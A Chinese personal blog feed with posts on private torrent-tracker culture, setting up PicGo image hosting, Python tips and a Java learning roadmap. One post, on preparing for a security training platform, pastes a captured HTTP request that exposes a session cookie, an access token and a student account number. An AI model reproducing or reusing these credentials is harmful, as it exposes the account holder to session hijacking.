<p>也可以通过 Hetzner、Kimsufi、OVHCloud 等云服务及托管商购买独立服务器（dedicated server，也称作独服、杜甫）。“大盘鸡”是坊间黑话，用以指代硬盘很大的服务器。</p>
</blockquote>
<blockquote>
<p>当然，也可以自己搭建黑群晖或直接使用群晖 Synology、威联通 QNAP 等成品 NAS 或使用 OpenMediaVault、VMWare ESXi、UNRaid 搭建私人的 HTPC 平台。</p>
</blockquote>
<h2 id=""><a href="#" class="headerlink" title="========================================================================"></a>========================================================================</h2><h2 id="【我的路】"><a href="#【我的路】" class="headerlink" title="【我的路】"></a>【我的路】</h2><blockquote>
<p>我一开始是游荡在各大电子书资源站，后来了解到聆音这个PT站才接触到这个圈子。起初一直很佛系，也看过人感叹，“自己花了那么多金钱和精力，电影没看几部，全都在刷数据上。”但并不在意。后来收到一张PT站点总结图，瞬间就不安分了，开始找各大站点邀请，从南北洋到学校、TCCF，再到九大。</p>
</blockquote>
<blockquote>
<p>每次进新站，看到自己的等级和数据量就有种莫名的危机感，怕没到VU容易被Ban，怕遇到想下载的资源时Buffer不足……但其实每天一键书签，就是保号窍门；保种魔力兑换上传，完全不用流量不足；等级只是个PT指标，短时间追逐等级只会影响生活，成为一个盯着rss新种和客户端上传速度的机器。</p>
</blockquote>
<blockquote>
<p>现在我有几个内站顶站，已经佛了，没集齐的九大也不想要，因为特色重叠和担心玩不过来，重心放在发掘感兴趣的站点，比如我喜欢电子书，所以我想要Bib……但我想这些话说的再多也挡不住新人追求大站的心，因为大站确实资源多、上传多、下载快，又或者说被PT玩的痛苦、郁闷就是为了大站到手时能够欢呼、长吁。</p>
</blockquote>
<h2 id="【Pter的路】"><a href="#【Pter的路】" class="headerlink" title="【Pter的路】"></a>【Pter的路】</h2><blockquote>
<p>相信不少人跟我一样，从一开始是因为【需要】稀缺的学习资料、高清的影视作品或收费的综艺番剧，偶然间发现PT这块宝地；<br>但PT站内大神太多了，在不知不觉间变成了【想要】：</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">别人有的高级站，我想要；
别人有的华丽数据，我想要；
别人有的高级观影设备，我想要；
……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">但是高手之上还有高手，支线诱惑太多让人越“玩”PT越累，
最终被PT“玩”。
要认清自己的极限，
承认自己不是最特别的一个，寻找舒适的状态。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Pter通过做种、发种和保种入门后，都在以不同的方式维系PT站：</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">发种鸡为站点注入活水；
保种党让优秀的资源代代相传；
官制组树立起高质量资源的标准；
审核员进化成小水管千呼万唤的菩萨；
程序员外御强敌内防BUG；
管理员为站点长久繁荣谋篇布局……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="【PT站的路】"><a href="#【PT站的路】" class="headerlink" title="【PT站的路】"></a>【PT站的路】</h2><blockquote>
<p>PT站发展往大了说无非守成与革新：</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">守成已是不易，拿来主义建立一个网站，
在萌芽时招兵买马做推广，
在上升期维护服务器，在平稳期做活动维持活跃度；
革新俨然魄力，更换网站架构、
改变发展方向或更新考核方式（吹TJUPT）等都为PT站吹来一阵新风，
无论效果如何，都是业界经验的积累。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Pter是PT站的基础，PT站是Pter的延伸。正是你痴迷大站，让PT站代际更替连贯；也正是每个Pter用爱发电，让站点名声在外。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">如果PT之路有终点，
我想就是广大Pter永久维护这种分享互助的氛围吧。
就像蜡笔小新剧场版《大人帝国反击战》那样，
过去是那么美好，但世界不能停步不前，
我们能做的就是在变化中求不变，
让老Pter回来后感叹一句，
“啊，这里还和记忆中一样，真好。”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="对于我来说，PT是一种慰藉："><a href="#对于我来说，PT是一种慰藉：" class="headerlink" title="对于我来说，PT是一种慰藉："></a>对于我来说，PT是一种慰藉：</h2><blockquote>
<p>一天再疲累，晚霞总是免费的吧；<br>不能买到实体/亲临现场，下载总是方便的吧<br>就算下了不看，心里也舒坦（仓鼠行为）<br>优秀的作品能借助PT长久存续，是件幸事<br>自己能从中体味到一些喜怒哀乐，亦是幸事</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">和朋友闲聊
本以为再如何，总有游戏玩，
现在这一爱好竟日薄西山。
人是要有爱好的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<blockquote>
<p>祝愿诸位能有自己的爱好，恒久的、温暖的爱好。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>12周年的阿B站在了半山腰上</title>
    <url>/2021/07/05/12%E5%91%A8%E5%B9%B4%E7%9A%84%E9%98%BFB%E7%AB%99%E5%9C%A8%E4%BA%86%E5%8D%8A%E5%B1%B1%E8%85%B0%E4%B8%8A/</url>
    <content><![CDATA[<p>B站发展分析</p>
<a id="more"></a>

<iframe src="//player.bilibili.com/player.html?aid=418961404&bvid=BV1PV411W71o&cid=363942442&page=1" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> 
</iframe>]]></content>
  </entry>
  <entry>
    <title>PicGo + smms 构建图床</title>
    <url>/2021/05/31/PicGo%20+%20smms%20%E6%9E%84%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<p>图床</p>
<a id="more"></a>





<h2 id="PicGo设置smms的token"><a href="#PicGo设置smms的token" class="headerlink" title="PicGo设置smms的token"></a>PicGo设置smms的token</h2><p>sm.ms开始支持API version 2，下面的之前写的很多都不能用了。这里在更新一下API version 2下的设置。</p>
<h3 id="下载PicGo-2-3-0-beta-0"><a href="#下载PicGo-2-3-0-beta-0" class="headerlink" title="下载PicGo 2.3.0-beta.0"></a>下载PicGo 2.3.0-beta.0</h3><p>PicGo 2.3.0-beta.0</p>
<p>Windows要下载.exe文件。</p>
<p><img src="https://i.loli.net/2021/05/31/gFQSdUK9frW3IpE.png" alt="在这里插入图片描述"></p>
<h3 id="获取API-Token"><a href="#获取API-Token" class="headerlink" title="获取API Token"></a>获取API Token</h3><p><img src="https://i.loli.net/2021/05/31/k7JT6LnShMYyObi.png" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/05/31/E7nl5kCVwyp3HW9.png" alt="在这里插入图片描述"></p>
<h3 id="PicGo中设置sm-ms图床"><a href="#PicGo中设置sm-ms图床" class="headerlink" title="PicGo中设置sm.ms图床"></a>PicGo中设置sm.ms图床</h3><p><img src="https://i.loli.net/2021/05/31/o7GZhFHYaqJclnz.png" alt="在这里插入图片描述"></p>
<p>Here we are!</p>
<p>PicGo</p>
<h2 id="为什么需要图床"><a href="#为什么需要图床" class="headerlink" title="为什么需要图床"></a>为什么需要图床</h2><p><img src="https://i.loli.net/2021/05/31/S8JiLeYpkGdCsPa.png" alt="在这里插入图片描述"></p>
<p>使用markdown一直有一个不太舒服的点，就是图片保存的问题。markdown不像word那样可以直接保存图片，而是将图片本地会单独存放，以链接的形式插入在markdown中。</p>
<h3 id="这样就带来两个问题："><a href="#这样就带来两个问题：" class="headerlink" title="这样就带来两个问题："></a>这样就带来两个问题：</h3><blockquote>
<p>如果本地图片丢失或者位置变动，图片就挂了。</p>
</blockquote>
<blockquote>
<p>当将markdown文件上传到网站的时候（比如CSDN），由于网站无法读取你本地的文件，上传的markdown中的图片也会挂掉。</p>
</blockquote>
<p>这时候你就要一个一个上传图片。图片少了还好说，图片多了就火葬场了。</p>
<blockquote>
<p>一个解决办法是使用一个图床。也就是把图片上传到其他服务器，获得一个链接，然后插入markdown中。这样markdown文件读取的就是服务器的图片，而不是本地的图片了。</p>
</blockquote>
<blockquote>
<p>使用smms只能解决上面提到的第一个问题（即本地图片丢失或者位置变动，图片就挂了）。对于第二个问题，smms存在防盗链机制，上传markdown依旧会挂掉。</p>
</blockquote>
<h3 id="为什么选择PicGo"><a href="#为什么选择PicGo" class="headerlink" title="为什么选择PicGo"></a>为什么选择PicGo</h3><blockquote>
<ul>
<li>我将PicGo视为图床的接口，或者说是一个图形界面。</li>
</ul>
</blockquote>
<p>既然如此，我希望这个界面简介，功能就好了。</p>
<p>功能包括：</p>
<blockquote>
<p>设置不同的图床<br>返回的链接格式（直接返回到剪贴板）<br>上传图片（拖拽上传、剪贴板上传）<br>另外，可以通过设置快捷键，来快速上传图片到图床：</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/31/Kkr28f69vCiVhbc.png" alt="在这里插入图片描述"></p>
<h3 id="PicGo下载"><a href="#PicGo下载" class="headerlink" title="PicGo下载"></a>PicGo下载</h3><p>GitHub：PicGo</p>
<p>smms<br>官网地址：<a href="https://sm.ms/">https://sm.ms</a></p>
<p>永久存储，图片链接支持https，可以删除上传的图片，提供多种图片链接格式。</p>
<p>每个图片最大5M，单次最多上传10张 。</p>
<p>PicGo图床设定为smms<br>下载smms-user插件<br>要下载一个插件：picgo-plugin-smms-user</p>
<p>在PicGo软件中下载比较慢，建议通过GitHub将项目clone。</p>
<p>clone之后得到picgo-plugin-smms-user文件夹：</p>
<p><img src="https://i.loli.net/2021/05/31/mDEcs8Bfh3ZNVia.png" alt="在这里插入图片描述"></p>
<p>下载nodejs</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">要下载nodejs，否则安装插件运行

npm install <span class="token punctuation">.</span><span class="token operator">/</span>picgo<span class="token operator">-</span>plugin<span class="token operator">-</span>smms<span class="token operator">-</span>user

时会出现如下报错：

<span class="token string">'npm'</span> 不是内部或外部命令，也不是可运行的程序

下载nodejs的网址是：http<span class="token punctuation">:</span><span class="token operator">//</span>nodejs<span class="token punctuation">.</span>cn<span class="token operator">/</span>download<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p>下载完毕nodejs之后，要设置环境变量，在Path中加入路径C:\Program Files\nodejs（注：此路径为安装路径，可变）。</p>
<p>更改环境变量见：设置Python环境变量-Windows10</p>
<p>注意：设置好环境变量后要重启计算机。</p>
<p>安装smms-user插件到PicGo<br>将clone之后得到的picgo-plugin-smms-user文件夹放到PicGo的安装路径下：</p>
<p><img src="https://i.loli.net/2021/05/31/iEpYz2dkU1flNMB.png" alt="在这里插入图片描述"></p>
<p>双击进入该文件，shift+右键，进入PowerShell，输入命令npm install ./picgo-plugin-smms-user即可。</p>
<p><img src="https://i.loli.net/2021/05/31/RHiGs3wvW54XpIB.png" alt="在这里插入图片描述"></p>
<p>PicGo设置smms的token<br>进入该网址，获取 Secret Token。</p>
<p><img src="https://i.loli.net/2021/05/31/SOKQZRpBkNawtAv.png" alt="在这里插入图片描述"></p>
<p>将生成的Secret Token复制到PicGo中：</p>
]]></content>
  </entry>
  <entry>
    <title>Python 蓝盾实战准备</title>
    <url>/2021/05/31/Python%20%E8%93%9D%E7%9B%BE%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>蓝盾云安全实训平台</p>
<a id="more"></a>




<p>实验文档：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span><span class="token operator">/</span>?token<span class="token operator">=</span>1622445049_DQ624BcluXZ_o1MJkhxsATsMsoEqiHB38iAWdzkUrdT0ZMMJOit7OJNbh<span class="token operator">-</span>vO3UzWQ1ouHUqNxmd_3hJbNDn3bwPE7816BqF0YtFvvYTo<span class="token operator">-</span>aEVi<span class="token operator">-</span>pIF<span class="token operator">-</span>b7UUD6lpG2Fn01_1622445049<span class="token operator">&amp;</span>method<span class="token operator">=</span>down<span class="token operator">-</span><span class="token builtin">file</span><span class="token punctuation">.</span>exper<span class="token operator">-</span>guide<span class="token operator">&amp;</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>




<p>实验视频：</p>
<p><a href="http://10.101.10.3/#/training/video?chapter_id=1028">http://10.101.10.3/#/training/video?chapter_id=1028</a></p>
<p><img src="https://i.loli.net/2021/05/31/8OIoecWB9G2z6xR.jpg" alt="img"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">实验视频标题：

<span class="token operator">//</span><span class="token operator">*</span><span class="token punctuation">[</span>@<span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"trainingSystemVideo"</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token operator">/</span>h1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2021/05/31/1KcOevaPmTAVFu5.jpg" alt="img"> </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span><span class="token operator">*</span><span class="token punctuation">[</span>@<span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"trainin·gSystemVideo"</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token operator">/</span>ul<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2021/05/31/hu25TyDHEk6I4vF.jpg" alt="img"> </p>
<p>· 所属课程：非对称密码算法</p>
<p>· 课程难度：初级</p>
<p>· 学习时长：40分钟</p>
<p>· 课件资源： </p>
<p>视频介绍：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span><span class="token operator">*</span><span class="token punctuation">[</span>@<span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"trainingSystemVideo"</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">/</span>div<span class="token operator">/</span>div<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<pre class="line-numbers language-python" data-language="python"><code class="language-python">
视频：

Request URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span><span class="token operator">/</span>

Request Method<span class="token punctuation">:</span> POST

Status Code<span class="token punctuation">:</span> <span class="token number">200</span> OK

Remote Address<span class="token punctuation">:</span> <span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span><span class="token punctuation">:</span><span class="token number">80</span>

Referrer Policy<span class="token punctuation">:</span> strict<span class="token operator">-</span>origin<span class="token operator">-</span>when<span class="token operator">-</span>cross<span class="token operator">-</span>origin

Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Headers<span class="token punctuation">:</span> X<span class="token operator">-</span>Requested<span class="token operator">-</span>With<span class="token punctuation">,</span>X_Requested_With

Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Origin<span class="token punctuation">:</span> <span class="token operator">*</span>

Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> no<span class="token operator">-</span>store<span class="token punctuation">,</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> must<span class="token operator">-</span>revalidate

Connection<span class="token punctuation">:</span> keep<span class="token operator">-</span>alive

Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json

Date<span class="token punctuation">:</span> Mon<span class="token punctuation">,</span> <span class="token number">31</span> May <span class="token number">2021</span> <span class="token number">07</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token number">11</span> GMT

Expires<span class="token punctuation">:</span> Thu<span class="token punctuation">,</span> <span class="token number">19</span> Nov <span class="token number">1981</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token number">00</span> GMT

Pragma<span class="token punctuation">:</span> no<span class="token operator">-</span>cache

Server<span class="token punctuation">:</span> nginx

Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

X<span class="token operator">-</span>Frame<span class="token operator">-</span>Options<span class="token punctuation">:</span> SAMEORIGIN

X<span class="token operator">-</span>XSS<span class="token operator">-</span>Protection<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> mode<span class="token operator">=</span>block

 

 

 

 

Accept<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">,</span> text<span class="token operator">/</span>plain<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>

Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate

Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>

Connection<span class="token punctuation">:</span> keep<span class="token operator">-</span>alive

Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">508</span>

Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>WebKitFormBoundaryBMHJsNbBvWA0LYpw

 

 

 

Cookie<span class="token punctuation">:</span> PHPSESSID<span class="token operator">=</span>88iv8j97gd127brrrd74nu8sbp<span class="token punctuation">;</span> BD<span class="token operator">-</span>EDUCATION<span class="token operator">-</span>FRONTEND<span class="token operator">-</span>NAME<span class="token operator">=</span><span class="token operator">%</span>E7<span class="token operator">%</span>BD<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span>E5<span class="token operator">%</span>AE<span class="token operator">%</span><span class="token number">8F</span><span class="token operator">%</span>E4<span class="token operator">%</span>BA<span class="token operator">%</span>AE<span class="token punctuation">;</span> BD<span class="token operator">-</span>EDUCATION<span class="token operator">-</span>FRONTEND<span class="token operator">-</span>TOKEN<span class="token operator">=</span>1622445049_DQ624BcluXZ_o1MJkhxsATsMsoEqiHB38iAWdzkUrdT0ZMMJOit7OJNbh<span class="token operator">-</span>vO3UzWQ1ouHUqNxmd_3hJbNDn3bwPE7816BqF0YtFvvYTo<span class="token operator">-</span>aEVi<span class="token operator">-</span>pIF<span class="token operator">-</span>b7UUD6lpG2Fn01_1622445049<span class="token punctuation">;</span> BD<span class="token operator">-</span>EDUCATION<span class="token operator">-</span>FRONTEND<span class="token operator">-</span>ACCOUNT<span class="token operator">=</span><span class="token number">1914080903119</span>

 

 

 

Host<span class="token punctuation">:</span> <span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span>

Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span>

Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.101</span><span class="token number">.10</span><span class="token number">.3</span><span class="token operator">/</span>

User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">90.0</span><span class="token number">.4430</span><span class="token number">.212</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>

 

 

 

 

 

 

chapter_id<span class="token punctuation">:</span> <span class="token number">1028</span>

method<span class="token punctuation">:</span> lesson<span class="token punctuation">.</span>student<span class="token operator">-</span><span class="token keyword">in</span><span class="token operator">-</span>video<span class="token operator">-</span>page

token<span class="token punctuation">:</span> 1622445049_DQ624BcluXZ_o1MJkhxsATsMsoEqiHB38iAWdzkUrdT0ZMMJOit7OJNbh<span class="token operator">-</span>vO3UzWQ1ouHUqNxmd_3hJbNDn3bwPE7816BqF0YtFvvYTo<span class="token operator">-</span>aEVi<span class="token operator">-</span>pIF<span class="token operator">-</span>b7UUD6lpG2Fn01_1622445049<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫准备</title>
    <url>/2021/05/31/python%E7%88%AC%E8%99%AB%E5%87%86%E5%A4%87/</url>
    <content><![CDATA[<p>PyCharm安装Python第三方库教程以及报错解决方法</p>
<a id="more"></a>

<p><a href="http://cache.baiducontent.com/c?m=2DuxcmjutCtF6-UvCbYtrRwglkO2AY2o8FJT9FbeUgvrWBqHNNDvtggCNkrAsXZfosiPN3vdkj3zzlwGDW3-3CIvDL3AxN4Mg1Sq-216J9BSd3E9y2qFjTOLIrMHZriQRxBthSEvPfbjb-iLQI3xVpIX70qU2P2azwwMD7fbe-W&amp;p=9d769a4792dd11a05bec946d4c0a85&amp;newp=9e62c64ad4820eeb10bd9b7d0c1681231610db2151d7d41e6b82c825d7331b001c3bbfb42329170fd9c37f6303af485aecfa3075370923a3dda5c91d9fb4c57479c9687038&amp;s=1679091c5a880faf&amp;user=baidu&amp;fm=sc&amp;query=pycharm+error+occurred+when&amp;qid=c62f368c000b886f&amp;p1=3">http://cache.baiducontent.com/c?m=2DuxcmjutCtF6-UvCbYtrRwglkO2AY2o8FJT9FbeUgvrWBqHNNDvtggCNkrAsXZfosiPN3vdkj3zzlwGDW3-3CIvDL3AxN4Mg1Sq-216J9BSd3E9y2qFjTOLIrMHZriQRxBthSEvPfbjb-iLQI3xVpIX70qU2P2azwwMD7fbe-W&amp;p=9d769a4792dd11a05bec946d4c0a85&amp;newp=9e62c64ad4820eeb10bd9b7d0c1681231610db2151d7d41e6b82c825d7331b001c3bbfb42329170fd9c37f6303af485aecfa3075370923a3dda5c91d9fb4c57479c9687038&amp;s=1679091c5a880faf&amp;user=baidu&amp;fm=sc&amp;query=pycharm+error+occurred+when&amp;qid=c62f368c000b886f&amp;p1=3</a></p>
<h2 id="安装库通用模板，阿里镜像"><a href="#安装库通用模板，阿里镜像" class="headerlink" title="安装库通用模板，阿里镜像"></a>安装库通用模板，阿里镜像</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip install <span class="token operator">-</span>i http<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>pypi<span class="token operator">/</span>simple  manimpango <span class="token operator">-</span><span class="token operator">-</span>trusted<span class="token operator">-</span>host mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="批量加引号"><a href="#批量加引号" class="headerlink" title="批量加引号"></a>批量加引号</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>

<span class="token string">'$1'</span><span class="token punctuation">:</span><span class="token string">'$2'</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="python转exe"><a href="#python转exe" class="headerlink" title="python转exe"></a>python转exe</h2><p>pyinstaller -F -i favicon.ico test.py</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习路线</title>
    <url>/2021/05/30/java%E8%B7%AF%E7%BA%BF/</url>
    <content><![CDATA[<p>记得多做一些实战项目！</p>
<a id="more"></a>

<p><img src="https://pic4.zhimg.com/50/v2-e9205e1dea9a05c4073ca3d72ff3becc_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-e9205e1dea9a05c4073ca3d72ff3becc_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>项目地址：</p>
<ul>
<li>Github地址：<a href="https://link.zhihu.com/?target=https://github.com/Snailclimb/JavaGuide">Snailclimb/JavaGuide</a></li>
<li>Gitee地址： <a href="https://link.zhihu.com/?target=https://gitee.com/SnailClimb/JavaGuide">SnailClimb/JavaGuide</a>（Github 无法访问或者访问速度比较慢的小伙伴可以看码云上的对应内容）</li>
</ul>
<p>如果你想让自己的简历更好看的话，记得多做一些实战项目！</p>
<p><a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&mid=100018862&idx=1&sn=858e00b60c6097e3ba061e79be472280&chksm=4ea1856579d60c73224e4d852af6b0188c3ab905069fc28f4b293963fd1ee55d2069fb229848%23rd">2021 最新Java实战项目源码打包下载mp.weixin.qq.com<img src="https://pic2.zhimg.com/v2-5c70f2d4123edf16afab8b4bed070b4d_180x120.jpg" alt="图标"></a></p>
<p>断断续续写了快大半个月，终于把 2021 最新版的 Java 后端学习路线给整完了！希望对你有帮助！</p>
<p>这篇回答可能是你看过最用心、最全面的 Java 后端学习路线。</p>
<p>为了完成这份学习路线，最近熬了很多次夜，因为琐碎的事情太多，很难有一块比较完整的时间专门用来做这件事。</p>
<p>其实，说这个并不是为了让大家同情我。相反，我觉得我在熬夜肝学习路线的时候是快乐的，因为这是我喜欢做的事情。</p>
<p><img src="https://pic1.zhimg.com/50/v2-805206e68c9c8c29733c32888eeef216_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-805206e68c9c8c29733c32888eeef216_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>这篇回答不会涉及到学习方法以及学习网站的推荐，我不想让篇幅太长，内容太杂，我希望留着下一篇文章专门来谈一谈。</p>
<p>另外，这篇回答也不会涉及到计算机基础，也是为了保证内容的不至于太杂。计算基础相关的内容我也已经写好，预计会在五一同步给小伙伴们。</p>
<p><img src="https://pic2.zhimg.com/50/v2-06c2cdc3e5d417486d1cb92687350ed4_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic2.zhimg.com/80/v2-06c2cdc3e5d417486d1cb92687350ed4_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>多说一句，对于编程初学者，我不太建议上来通过做项目学习。实践确实很重要，如果你没有编程基础的话，直接上手实战，很容易最后学个四不像。</p>
<p>建议你在学习编程的初期尽量多看一些优质视频。跟着视频一步一步走，可以让你少踩很多坑，学习编程的信心也会增加。</p>
<p><strong>概览：</strong></p>
<p><img src="https://pic4.zhimg.com/50/v2-62586d6789e1a081cc3dc6efd7bdd289_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic4.zhimg.com/80/v2-62586d6789e1a081cc3dc6efd7bdd289_1440w.jpg?source=1940ef5c" alt="img"></p>
<p>回答中的相关书籍我也已经同步到了 Github和Gitee上（有PDF版本可供下载），欢迎小伙伴们一起完善。</p>
<ul>
<li>Github地址：<a href="https://link.zhihu.com/?target=https://github.com/CodingDocs/awesome-cs">https://github.com/CodingDocs/awesome-cs</a></li>
<li>码云地址：<a href="https://link.zhihu.com/?target=https://gitee.com/SnailClimb/awesome-cs">https://gitee.com/SnailClimb/awesome-cs</a> （Github无法访问或者访问速度比较慢的小伙伴可以看码云上的对应内容）</li>
</ul>
<h2 id="Java-基础"><a href="#Java-基础" class="headerlink" title="Java 基础"></a><strong>Java 基础</strong></h2><p>如果你之前没有学习过编程的话，我建议你可以看看视频教程。</p>
<p>像尚硅谷的 <a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV1Kb411W75N">《 Java 基础教程系列》</a>和韩顺平老师的<a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV1fh411y7R8">《零基础 30 天学会 Java》</a>就很不错。</p>
<p><img src="https://pic1.zhimg.com/50/v2-2217d04b42c6f79aa126432672133c25_hd.jpg?source=1940ef5c" alt="img"><img src="https://pic1.zhimg.com/80/v2-2217d04b42c6f79aa126432672133c25_1440w.jpg?source=1940ef5c" alt="img"></p>
